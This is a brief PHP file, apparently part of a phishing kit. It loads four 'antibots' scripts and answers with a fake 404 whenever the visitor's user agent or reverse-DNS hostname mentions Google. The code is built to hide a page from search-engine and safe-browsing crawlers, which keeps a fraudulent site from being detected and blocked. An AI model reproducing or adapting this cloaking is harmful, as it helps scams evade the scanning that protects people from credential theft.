<?php


session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../BOTS/antibots1.php";
include "../../BOTS/antibots2.php";
include "../../BOTS/antibots3.php";
include "../../BOTS/antibots4.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//

?>
